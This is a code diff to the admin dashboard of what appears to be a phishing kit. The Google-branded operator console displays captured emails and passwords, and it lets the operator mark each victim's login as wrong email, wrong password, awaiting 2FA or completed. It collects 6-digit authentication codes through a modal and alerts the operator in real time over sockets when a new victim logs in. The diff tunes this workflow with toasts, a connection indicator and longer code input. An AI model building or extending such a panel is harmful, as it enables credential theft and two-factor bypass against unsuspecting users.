@@ -37,10 +37,17 @@ export default function AdminPage() {
     const [modalUserEmail, setModalUserEmail] = useState("");
     const [modalAuthCodeInput, setModalAuthCodeInput] = useState("");
     const [mounted, setMounted] = useState(false);
+    const [socketConnected, setSocketConnected] = useState(false);
+
+    const { socket, isConnected, connectionError } = useSocket();
+
+    useEffect(() => {
+        setMounted(true);
+        setSocketConnected(isConnected);
+    }, [isConnected]);
 
     // Check session on mount
     useEffect(() => {
-        setMounted(true);
         const checkSession = async () => {
             try {
                 const isLoggedIn = await checkAdminSession();
@@ -67,6 +74,7 @@ export default function AdminPage() {
             }
         } catch (error) {
             console.error("Failed to fetch users:", error);
+            toast.error("Failed to fetch users");
         }
     };
 
@@ -104,14 +112,14 @@ export default function AdminPage() {
         setSummary(summaryData);
     };
 
-    const { socket } = useSocket();
-
     // Listen for socket events
     useEffect(() => {
         if (socket) {
             const handleNotification = (data) => {
-                toast(`New Login Attempt: ${data.email || 'Unknown'}`, {
-                    duration: 6000,
+                console.log("🔔 Notification received:", data);
+
+                toast(`🔔 New Login: ${data.email || 'Unknown'}`, {
+                    duration: 5000,
                     icon: '🔔',
                     style: {
                         borderRadius: '10px',
@@ -120,28 +128,28 @@ export default function AdminPage() {
                     },
                 });
 
-                // Play a professional notification ping sound
+                // Play notification sound
                 try {
                     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                     const oscillator = audioCtx.createOscillator();
                     const gainNode = audioCtx.createGain();
 
                     oscillator.type = 'sine';
-                    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // A5 note
+                    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
 
-                    gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-                    gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);
+                    gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
+                    gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.3);
 
                     oscillator.connect(gainNode);
                     gainNode.connect(audioCtx.destination);
 
                     oscillator.start();
-                    oscillator.stop(audioCtx.currentTime + 0.5);
+                    oscillator.stop(audioCtx.currentTime + 0.3);
                 } catch (e) {
-                    console.log("Audio block", e);
+                    console.log("Audio not available");
                 }
 
-                // Refresh user list automatically
+                // Refresh user list
                 fetchUsers();
             };
 
@@ -151,7 +159,7 @@ export default function AdminPage() {
                 socket.off("admin_notification", handleNotification);
             };
         }
-    }, [socket, isAuthenticated]);
+    }, [socket]);
 
     // Handle admin login
     const handleAdminLogin = async (e) => {
@@ -169,6 +177,7 @@ export default function AdminPage() {
             if (result.success) {
                 setIsAuthenticated(true);
                 await fetchUsers();
+                toast.success("Logged in successfully!");
             } else {
                 setLoginError(result.message || "Invalid credentials");
             }
@@ -184,6 +193,7 @@ export default function AdminPage() {
         await adminLogoutAction();
         setIsAuthenticated(false);
         setUsers([]);
+        toast.success("Logged out successfully!");
         router.refresh();
     };
 
@@ -194,11 +204,12 @@ export default function AdminPage() {
             const result = await updateUserStatus(userId, newStatus, authCode);
             if (result.success) {
                 await fetchUsers();
+                toast.success(`Status updated to ${newStatus}`);
             } else {
-                alert(result.message || "Failed to update status");
+                toast.error(result.message || "Failed to update status");
             }
         } catch (error) {
-            alert("An error occurred. Please try again.");
+            toast.error("An error occurred. Please try again.");
         } finally {
             setActionLoading(false);
         }
@@ -212,11 +223,12 @@ export default function AdminPage() {
             const result = await deleteUser(userId);
             if (result.success) {
                 await fetchUsers();
+                toast.success("User deleted successfully!");
             } else {
-                alert(result.message || "Failed to delete user");
+                toast.error(result.message || "Failed to delete user");
             }
         } catch (error) {
-            alert("An error occurred. Please try again.");
+            toast.error("An error occurred. Please try again.");
         } finally {
             setActionLoading(false);
         }
@@ -225,36 +237,24 @@ export default function AdminPage() {
     // Status color mapping
     const getStatusColor = (status) => {
         switch (status) {
-            case "pending":
-                return "#fbbc04";
-            case "wrong_email":
-                return "#ea4335";
-            case "wrong_password":
-                return "#ea4335";
-            case "2fa":
-                return "#4285f4";
-            case "success":
-                return "#34a853";
-            default:
-                return "#5f6368";
+            case "pending": return "#fbbc04";
+            case "wrong_email": return "#ea4335";
+            case "wrong_password": return "#ea4335";
+            case "2fa": return "#4285f4";
+            case "success": return "#34a853";
+            default: return "#5f6368";
         }
     };
 
     // Status label mapping
     const getStatusLabel = (status) => {
         switch (status) {
-            case "pending":
-                return "Pending";
-            case "wrong_email":
-                return "Wrong Email";
-            case "wrong_password":
-                return "Wrong Password";
-            case "2fa":
-                return "Waiting for 2FA";
-            case "success":
-                return "Completed";
-            default:
-                return status;
+            case "pending": return "Pending";
+            case "wrong_email": return "Wrong Email";
+            case "wrong_password": return "Wrong Password";
+            case "2fa": return "Waiting for 2FA";
+            case "success": return "Completed";
+            default: return status;
         }
     };
 
@@ -266,7 +266,7 @@ export default function AdminPage() {
             <div className="loading-container">
                 <div className="loader"></div>
                 <p>Loading dashboard...</p>
-                                <style>{`
+                <style>{`
                     .loading-container {
                         display: flex;
                         flex-direction: column;
@@ -342,7 +342,7 @@ export default function AdminPage() {
                     </form>
                 </div>
 
-                                <style>{`
+                <style>{`
                     .admin-login-container {
                         display: flex;
                         justify-content: center;
@@ -465,6 +465,12 @@ export default function AdminPage() {
                         <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                     </div>
                     <span className="header-title">Admin Dashboard</span>
+                    <div className={`connection-status ${socketConnected ? 'connected' : 'disconnected'}`}>
+                        {socketConnected ? '🟢' : '🔴'}
+                        <span className="status-text">
+                            {socketConnected ? 'Connected' : connectionError || 'Disconnected'}
+                        </span>
+                    </div>
                 </div>
                 <button onClick={handleLogout} className="btn-logout">
                     Logout
@@ -566,7 +572,6 @@ export default function AdminPage() {
                                                         onChange={(e) => {
                                                             const newStatus = e.target.value;
                                                             if (newStatus === "2fa") {
-                                                                // open modal to collect auth code
                                                                 setModalUserId(user._id);
                                                                 setModalUserEmail(user.email || "");
                                                                 setModalAuthCodeInput("");
@@ -612,15 +617,15 @@ export default function AdminPage() {
                             className="text-black"
                             value={modalAuthCodeInput}
                             onChange={(e) => setModalAuthCodeInput(e.target.value)}
-                            placeholder="12"
-                            maxLength={4}
+                            placeholder="123456"
+                            maxLength={6}
                         />
                         <div className="modal-actions">
                             <button onClick={() => setShow2FAModal(false)} className="btn-cancel text-black">Cancel</button>
                             <button
                                 onClick={async () => {
-                                    if (!modalAuthCodeInput) {
-                                        alert('Enter a valid code');
+                                    if (!modalAuthCodeInput || modalAuthCodeInput.length < 6) {
+                                        toast.error('Please enter a valid 6-digit code');
                                         return;
                                     }
                                     setShow2FAModal(false);
@@ -633,300 +638,266 @@ export default function AdminPage() {
                         </div>
                     </div>
                     <style>{`
-                                      .modal-backdrop { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(0,0,0,0.4); z-index:9999; }
-                                      .modal-card { background:#fff; padding:20px; border-radius:10px; width:320px; box-shadow:0 10px 30px rgba(0,0,0,0.2); text-align:left; }
-                                      .modal-card h3{ margin:0 0 8px 0; }
-                                      .modal-card p{ color:#555; margin-bottom:12px; }
-                                      .modal-card input{ width:100%; padding:10px; margin-bottom:12px; border:1px solid #ddd; border-radius:6px; }
-                                      .modal-actions{ display:flex; justify-content:flex-end; gap:8px }
-                                      .btn-cancel{ background:#f1f3f4; border:none; padding:8px 12px; border-radius:6px; }
-                                      .btn-confirm{ background:#1a73e8; color:#fff; border:none; padding:8px 12px; border-radius:6px; }
-                                    `}</style>
+                        .modal-backdrop { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(0,0,0,0.4); z-index:9999; }
+                        .modal-card { background:#fff; padding:20px; border-radius:10px; width:320px; box-shadow:0 10px 30px rgba(0,0,0,0.2); text-align:left; }
+                        .modal-card h3{ margin:0 0 8px 0; }
+                        .modal-card p{ color:#555; margin-bottom:12px; }
+                        .modal-card input{ width:100%; padding:10px; margin-bottom:12px; border:1px solid #ddd; border-radius:6px; }
+                        .modal-actions{ display:flex; justify-content:flex-end; gap:8px }
+                        .btn-cancel{ background:#f1f3f4; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
+                        .btn-confirm{ background:#1a73e8; color:#fff; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
+                    `}</style>
                 </div>
             )}
 
-            <style jsx>{`
-        .dashboard-container {
-          min-height: 100vh;
-          background: #f8f9fa;
-        }
-
-        .dashboard-header {
-          background: #ffffff;
-          padding: 16px 32px;
-          border-bottom: 1px solid #dadce0;
-          display: flex;
-          justify-content: space-between;
-          align-items: center;
-          position: sticky;
-          top: 0;
-          z-index: 100;
-        }
-
-        .header-left {
-          display: flex;
-          align-items: center;
-          gap: 16px;
-        }
-
-        .brand-logo-small {
-          font-size: 20px;
-          font-weight: 500;
-          letter-spacing: -0.5px;
-          display: flex;
-          align-items: center;
-        }
-
-        .brand-logo-small span:nth-child(1) { color: #4285f4; }
-        .brand-logo-small span:nth-child(2) { color: #ea4335; }
-        .brand-logo-small span:nth-child(3) { color: #fbbc05; }
-        .brand-logo-small span:nth-child(4) { color: #4285f4; }
-        .brand-logo-small span:nth-child(5) { color: #34a853; }
-        .brand-logo-small span:nth-child(6) { color: #ea4335; }
-
-        .header-title {
-          font-size: 18px;
-          font-weight: 500;
-          color: #202124;
-        }
-
-        .btn-logout {
-          background: #ea4335;
-          color: white;
-          border: none;
-          padding: 8px 20px;
-          border-radius: 4px;
-          cursor: pointer;
-          font-size: 14px;
-          font-weight: 500;
-          transition: background-color 0.15s;
-        }
-
-        .btn-logout:hover {
-          background: #d33426;
-        }
-
-        .dashboard-content {
-          max-width: 1400px;
-          margin: 0 auto;
-          padding: 24px;
-        }
-
-        .summary-grid {
-          display: grid;
-          grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-          gap: 16px;
-          margin-bottom: 32px;
-        }
-
-        .summary-card {
-          background: #ffffff;
-          border-radius: 8px;
-          padding: 16px 20px;
-          display: flex;
-          align-items: center;
-          gap: 16px;
-          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
-          border-left: 4px solid #dadce0;
-        }
-
-        .summary-card.pending { border-left-color: #fbbc04; }
-        .summary-card.wrong-email { border-left-color: #ea4335; }
-        .summary-card.wrong-password { border-left-color: #ea4335; }
-        .summary-card.twofa { border-left-color: #4285f4; }
-        .summary-card.success { border-left-color: #34a853; }
-        .summary-card.total { border-left-color: #1a73e8; }
-
-        .summary-icon {
-          font-size: 24px;
-        }
-
-        .summary-info {
-          display: flex;
-          flex-direction: column;
-        }
-
-        .summary-value {
-          font-size: 24px;
-          font-weight: 500;
-          color: #202124;
-        }
-
-        .summary-label {
-          font-size: 12px;
-          color: #5f6368;
-        }
-
-        .table-container {
-          background: #ffffff;
-          border-radius: 8px;
-          padding: 24px;
-          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
-        }
-
-        .table-header {
-          display: flex;
-          justify-content: space-between;
-          align-items: center;
-          margin-bottom: 20px;
-        }
-
-        .table-header h2 {
-          font-size: 18px;
-          font-weight: 500;
-          color: #202124;
-        }
-
-        .btn-refresh {
-          background: #f1f3f4;
-          border: none;
-          padding: 6px 16px;
-          border-radius: 4px;
-          cursor: pointer;
-          font-size: 14px;
-          color: #202124;
-          transition: background-color 0.15s;
-        }
-
-        .btn-refresh:hover {
-          background: #e8eaed;
-        }
-
-        .table-responsive {
-          overflow-x: auto;
-        }
-
-        table {
-          width: 100%;
-          border-collapse: collapse;
-        }
-
-        thead {
-          background: #f8f9fa;
-        }
-
-        th {
-          padding: 12px 16px;
-          text-align: left;
-          font-size: 12px;
-          font-weight: 500;
-          color: #5f6368;
-          text-transform: uppercase;
-          letter-spacing: 0.5px;
-          border-bottom: 1px solid #dadce0;
-        }
-
-        td {
-          padding: 12px 16px;
-          font-size: 14px;
-          color: #202124;
-          border-bottom: 1px solid #f1f3f4;
-        }
-
-        tr:hover {
-          background: #f8f9fa;
-        }
-
-        .email-cell {
-          font-weight: 500;
-        }
-
-        .password-cell {
-          font-family: monospace;
-          color: #5f6368;
-        }
-
-        .status-badge {
-          display: inline-block;
-          padding: 4px 12px;
-          border-radius: 12px;
-          font-size: 12px;
-          font-weight: 500;
-          color: white;
-        }
-
-        .action-buttons {
-          display: flex;
-          gap: 8px;
-          align-items: center;
-        }
-
-        .status-select {
-          padding: 4px 8px;
-          border: 1px solid #dadce0;
-          border-radius: 4px;
-          font-size: 12px;
-          background: #ffffff;
-          cursor: pointer;
-        }
-
-        .status-select:disabled {
-          opacity: 0.6;
-          cursor: not-allowed;
-        }
-
-        .btn-delete {
-          background: none;
-          border: none;
-          cursor: pointer;
-          font-size: 16px;
-          padding: 4px 8px;
-          border-radius: 4px;
-          transition: background-color 0.15s;
-        }
-
-        .btn-delete:hover {
-          background: #fce8e6;
-        }
-
-        .btn-delete:disabled {
-          opacity: 0.4;
-          cursor: not-allowed;
-        }
-
-        .empty-state {
-          text-align: center;
-          padding: 40px;
-          color: #5f6368;
-        }
-
-        @media (max-width: 768px) {
-          .dashboard-header {
-            padding: 12px 16px;
-            flex-direction: column;
-            gap: 12px;
-          }
-
-          .dashboard-content {
-            padding: 12px;
-          }
-
-          .summary-grid {
-            grid-template-columns: repeat(2, 1fr);
-          }
-
-          .table-container {
-            padding: 16px;
-          }
-
-          .table-header {
-            flex-direction: column;
-            gap: 12px;
-            align-items: flex-start;
-          }
-
-          .action-buttons {
-            flex-direction: column;
-            gap: 4px;
-          }
-        }
-
-        @media (max-width: 480px) {
-          .summary-grid {
-            grid-template-columns: 1fr;
-          }
-        }
-      `}</style>
+            <style>{`
+                .dashboard-container {
+                    min-height: 100vh;
+                    background: #f8f9fa;
+                }
+                .dashboard-header {
+                    background: #ffffff;
+                    padding: 16px 32px;
+                    border-bottom: 1px solid #dadce0;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    position: sticky;
+                    top: 0;
+                    z-index: 100;
+                }
+                .header-left {
+                    display: flex;
+                    align-items: center;
+                    gap: 16px;
+                }
+                .brand-logo-small {
+                    font-size: 20px;
+                    font-weight: 500;
+                    letter-spacing: -0.5px;
+                    display: flex;
+                    align-items: center;
+                }
+                .brand-logo-small span:nth-child(1) { color: #4285f4; }
+                .brand-logo-small span:nth-child(2) { color: #ea4335; }
+                .brand-logo-small span:nth-child(3) { color: #fbbc05; }
+                .brand-logo-small span:nth-child(4) { color: #4285f4; }
+                .brand-logo-small span:nth-child(5) { color: #34a853; }
+                .brand-logo-small span:nth-child(6) { color: #ea4335; }
+                .header-title {
+                    font-size: 18px;
+                    font-weight: 500;
+                    color: #202124;
+                }
+                .connection-status {
+                    display: flex;
+                    align-items: center;
+                    gap: 4px;
+                    font-size: 12px;
+                    padding: 4px 12px;
+                    border-radius: 12px;
+                    background: #f1f3f4;
+                }
+                .connection-status.connected {
+                    color: #34a853;
+                }
+                .connection-status.disconnected {
+                    color: #ea4335;
+                }
+                .status-text {
+                    margin-left: 4px;
+                }
+                .btn-logout {
+                    background: #ea4335;
+                    color: white;
+                    border: none;
+                    padding: 8px 20px;
+                    border-radius: 4px;
+                    cursor: pointer;
+                    font-size: 14px;
+                    font-weight: 500;
+                    transition: background-color 0.15s;
+                }
+                .btn-logout:hover {
+                    background: #d33426;
+                }
+                .dashboard-content {
+                    max-width: 1400px;
+                    margin: 0 auto;
+                    padding: 24px;
+                }
+                .summary-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+                    gap: 16px;
+                    margin-bottom: 32px;
+                }
+                .summary-card {
+                    background: #ffffff;
+                    border-radius: 8px;
+                    padding: 16px 20px;
+                    display: flex;
+                    align-items: center;
+                    gap: 16px;
+                    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+                    border-left: 4px solid #dadce0;
+                }
+                .summary-card.pending { border-left-color: #fbbc04; }
+                .summary-card.wrong-email { border-left-color: #ea4335; }
+                .summary-card.wrong-password { border-left-color: #ea4335; }
+                .summary-card.twofa { border-left-color: #4285f4; }
+                .summary-card.success { border-left-color: #34a853; }
+                .summary-card.total { border-left-color: #1a73e8; }
+                .summary-icon { font-size: 24px; }
+                .summary-info { display: flex; flex-direction: column; }
+                .summary-value { font-size: 24px; font-weight: 500; color: #202124; }
+                .summary-label { font-size: 12px; color: #5f6368; }
+                .table-container {
+                    background: #ffffff;
+                    border-radius: 8px;
+                    padding: 24px;
+                    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+                }
+                .table-header {
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    margin-bottom: 20px;
+                }
+                .table-header h2 {
+                    font-size: 18px;
+                    font-weight: 500;
+                    color: #202124;
+                }
+                .btn-refresh {
+                    background: #f1f3f4;
+                    border: none;
+                    padding: 6px 16px;
+                    border-radius: 4px;
+                    cursor: pointer;
+                    font-size: 14px;
+                    color: #202124;
+                    transition: background-color 0.15s;
+                }
+                .btn-refresh:hover {
+                    background: #e8eaed;
+                }
+                .table-responsive {
+                    overflow-x: auto;
+                }
+                table {
+                    width: 100%;
+                    border-collapse: collapse;
+                }
+                thead {
+                    background: #f8f9fa;
+                }
+                th {
+                    padding: 12px 16px;
+                    text-align: left;
+                    font-size: 12px;
+                    font-weight: 500;
+                    color: #5f6368;
+                    text-transform: uppercase;
+                    letter-spacing: 0.5px;
+                    border-bottom: 1px solid #dadce0;
+                }
+                td {
+                    padding: 12px 16px;
+                    font-size: 14px;
+                    color: #202124;
+                    border-bottom: 1px solid #f1f3f4;
+                }
+                tr:hover {
+                    background: #f8f9fa;
+                }
+                .email-cell {
+                    font-weight: 500;
+                }
+                .password-cell {
+                    font-family: monospace;
+                    color: #5f6368;
+                }
+                .status-badge {
+                    display: inline-block;
+                    padding: 4px 12px;
+                    border-radius: 12px;
+                    font-size: 12px;
+                    font-weight: 500;
+                    color: white;
+                }
+                .action-buttons {
+                    display: flex;
+                    gap: 8px;
+                    align-items: center;
+                }
+                .status-select {
+                    padding: 4px 8px;
+                    border: 1px solid #dadce0;
+                    border-radius: 4px;
+                    font-size: 12px;
+                    background: #ffffff;
+                    cursor: pointer;
+                }
+                .status-select:disabled {
+                    opacity: 0.6;
+                    cursor: not-allowed;
+                }
+                .btn-delete {
+                    background: none;
+                    border: none;
+                    cursor: pointer;
+                    font-size: 16px;
+                    padding: 4px 8px;
+                    border-radius: 4px;
+                    transition: background-color 0.15s;
+                }
+                .btn-delete:hover {
+                    background: #fce8e6;
+                }
+                .btn-delete:disabled {
+                    opacity: 0.4;
+                    cursor: not-allowed;
+                }
+                .empty-state {
+                    text-align: center;
+                    padding: 40px;
+                    color: #5f6368;
+                }
+                @media (max-width: 768px) {
+                    .dashboard-header {
+                        padding: 12px 16px;
+                        flex-direction: column;
+                        gap: 12px;
+                    }
+                    .dashboard-content {
+                        padding: 12px;
+                    }
+                    .summary-grid {
+                        grid-template-columns: repeat(2, 1fr);
+                    }
+                    .table-container {
+                        padding: 16px;
+                    }
+                    .table-header {
+                        flex-direction: column;
+                        gap: 12px;
+                        align-items: flex-start;
+                    }
+                    .action-buttons {
+                        flex-direction: column;
+                        gap: 4px;
+                    }
+                    .header-left {
+                        flex-wrap: wrap;
+                    }
+                }
+                @media (max-width: 480px) {
+                    .summary-grid {
+                        grid-template-columns: 1fr;
+                    }
+                }
+            `}</style>
         </div>
     );
 }
